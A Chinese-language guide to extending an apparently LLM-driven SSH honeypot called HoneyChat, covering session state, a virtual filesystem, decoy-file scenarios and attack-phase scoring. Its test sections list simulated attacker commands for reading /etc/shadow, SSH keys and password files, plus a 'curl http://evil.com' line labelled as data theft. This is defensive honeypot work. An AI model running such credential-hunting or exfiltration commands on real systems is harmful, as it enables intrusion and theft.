# HoneyChat 扩展功能使用指南

## 🎉 新增功能概览

### 1. 会话状态管理
- 每个攻击者会话现在有独立的状态
- 记住当前目录、命令历史
- 会话自动超时清理（默认1小时）

### 2. 虚拟文件系统
- 支持真实的文件系统操作
- 命令：cd, pwd, ls, cat, mkdir, touch
- 攻击者创建的文件可以被后续访问

### 3. 攻击剧本引擎
- 自动检测攻击者意图
- 动态投放诱饵文件
- 4个预设场景：配置文件、SSH密钥、密码文件、数据库备份

### 4. 攻击链分析
- 自动识别攻击阶段
- 计算风险评分（0-100）
- 生成攻击摘要

## 🚀 快速测试

### 测试场景1：文件系统操作

```bash
# 连接蜜罐
ssh root@localhost -p 2222

# 测试命令
pwd                    # 显示 /home/user
cd /tmp               # 切换目录
pwd                    # 显示 /tmp
ls                     # 列出文件
cd /etc
cat passwd            # 读取虚拟文件
mkdir test            # 创建目录
touch test.txt        # 创建文件
ls                     # 看到新创建的文件
```

**预期效果**：所有命令响应连贯，目录切换生效

### 测试场景2：触发攻击剧本

```bash
# 场景1：寻找配置文件
ls -la | grep config
find . -name "*.env"
cat config.php        # 会看到假的数据库密码

# 场景2：寻找SSH密钥
cd ~/.ssh
ls
cat id_rsa            # 会看到假的私钥

# 场景3：寻找密码
cat /etc/shadow
find / -name "*password*"
cat /tmp/passwords.txt  # 会看到假的密码列表
```

**预期效果**：系统自动投放诱饵文件，攻击者能"发现"敏感信息

### 测试场景3：攻击链分析

```bash
# 执行一系列攻击命令
whoami                # 侦察阶段
uname -a              # 侦察阶段
sudo -l               # 提权尝试
find / -perm -4000    # 发现阶段
cat /etc/passwd       # 凭证访问
curl http://evil.com  # 数据窃取
```

**预期效果**：仪表盘显示攻击阶段和风险评分

## 📊 仪表盘新增字段

事件记录现在包含：
- `attack_phase`: 攻击阶段（reconnaissance, privilege_escalation等）
- `risk_score`: 风险评分（0-100）

## 🔧 配置选项

### 会话超时设置
编辑 `services/honeypot/session_manager.py`:
```python
self.session_timeout = 3600  # 秒，默认1小时
```

### 添加自定义诱饵
编辑 `services/honeypot/scenario_engine.py`:
```python
Scenario(
    name="custom_scenario",
    triggers=["关键词1", "关键词2"],
    baits={
        "/path/to/bait": "诱饵内容",
    },
)
```

### 自定义虚拟文件系统
编辑 `services/honeypot/virtual_fs.py` 的 `_init_default_fs()` 方法

## 🐛 故障排查

### 问题1：导入错误
```
ModuleNotFoundError: No module named 'session_manager'
```
**解决**：确保所有新文件都在 `services/honeypot/` 目录下

### 问题2：文件系统命令不工作
**检查**：查看日志，确认 `FSCommandHandler` 正常初始化

### 问题3：诱饵未部署
**检查**：确认命令包含触发关键词，查看日志中的 "Scenario triggered" 消息

## 📈 性能影响

- 内存增加：每个活跃会话约 1-2MB
- 响应速度：文件系统命令响应更快（不调用LLM）
- 存储增加：每个会话约 10-50KB

## 🎯 下一步扩展建议

1. **持久化会话状态**：将会话保存到数据库，重启后恢复
2. **更多协议支持**：添加 FTP、MySQL、Redis 蜜罐
3. **攻击链可视化**：在仪表盘显示攻击流程图
4. **自动化报告**：生成 PDF 格式的威胁分析报告
5. **威胁情报联动**：根据 IP 信誉动态调整诱饵

## 📝 代码结构

```
services/honeypot/
├── handler.py              # 核心处理逻辑（已修改）
├── session_manager.py      # 会话状态管理（新增）
├── virtual_fs.py           # 虚拟文件系统（新增）
├── scenario_engine.py      # 攻击剧本引擎（新增）
└── attack_analyzer.py      # 攻击链分析器（新增）
```

## 🔒 安全注意事项

1. 虚拟文件系统不会访问真实文件系统
2. 所有诱饵内容都是假的，不包含真实凭证
3. 会话数量有上限（默认1000），防止内存耗尽
4. 会话自动超时清理，防止资源泄露
